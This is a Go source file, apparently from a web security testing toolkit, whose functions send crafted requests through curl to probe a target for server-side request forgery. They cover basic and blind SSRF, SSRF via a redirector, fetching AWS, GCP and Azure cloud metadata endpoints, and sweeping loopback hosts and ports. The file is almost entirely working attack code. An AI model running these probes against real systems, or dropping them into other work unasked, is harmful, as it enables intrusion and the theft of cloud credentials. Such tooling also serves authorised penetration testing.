package websecurity

import (
	"fmt"
	"net/url"
	"strings"
)

func SSRFBasic(target, param, internalHost string) (string, error) {
	fullURL := fmt.Sprintf("%s?%s=%s", strings.TrimRight(target, "?"), param, url.QueryEscape(internalHost))
	cmd := throttledExec("curl", "-s", fullURL)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("SSRF basic test failed: %w: %s", err, string(out))
	}
	return fmt.Sprintf("SSRF basic test on %s via %s targeting %s: response_len=%d", target, param, internalHost, len(out)), nil
}

func SSRFBlind(target, param, collaborator string) (string, error) {
	fullURL := fmt.Sprintf("%s?%s=%s", strings.TrimRight(target, "?"), param, url.QueryEscape(collaborator))
	cmd := throttledExec("curl", "-s", fullURL)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("SSRF blind test failed: %w: %s", err, string(out))
	}
	return fmt.Sprintf("SSRF blind test on %s via %s with collaborator %s: response_len=%d", target, param, collaborator, len(out)), nil
}

func SSRFViaRedirect(target, redirector, internalHost string) (string, error) {
	redirectURL := fmt.Sprintf("%s?redir=%s", strings.TrimRight(target, "?"), url.QueryEscape(redirector))
	cmd := throttledExec("curl", "-s", redirectURL)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("SSRF redirect test failed: %w: %s", err, string(out))
	}
	return fmt.Sprintf("SSRF via redirect on %s through %s to %s: response_len=%d", target, redirector, internalHost, len(out)), nil
}

func SSRFCloudMetadata(target, param string) (string, error) {
	metadataURLs := []string{
		"http://169.254.169.254/latest/meta-data/",
		"http://metadata.google.internal/computeMetadata/v1/",
		"http://169.254.169.254/metadata/instance?api-version=2021-02-01",
	}
	var results []string
	for _, m := range metadataURLs {
		fullURL := fmt.Sprintf("%s?%s=%s", strings.TrimRight(target, "?"), param, url.QueryEscape(m))
		cmd := throttledExec("curl", "-s", fullURL)
		out, err := cmd.CombinedOutput()
		if err != nil {
			continue
		}
		results = append(results, fmt.Sprintf("%s: %d", m, len(out)))
	}
	return fmt.Sprintf("SSRF cloud metadata test on %s via %s: %s", target, param, strings.Join(results, " | ")), nil
}

func SSRFDetect(target, param string) (string, error) {
	internalHosts := []string{
		"http://127.0.0.1:80",
		"http://localhost:22",
		"http://0.0.0.0:8080",
		"http://[::1]:80",
	}
	var results []string
	for _, h := range internalHosts {
		fullURL := fmt.Sprintf("%s?%s=%s", strings.TrimRight(target, "?"), param, url.QueryEscape(h))
		cmd := throttledExec("curl", "-s", "--max-time", "5", fullURL)
		out, err := cmd.CombinedOutput()
		if err != nil {
			results = append(results, fmt.Sprintf("%s: error=%v", h, err))
			continue
		}
		results = append(results, fmt.Sprintf("%s: %d", h, len(out)))
	}
	return fmt.Sprintf("SSRF detection on %s via %s: %s", target, param, strings.Join(results, " | ")), nil
}
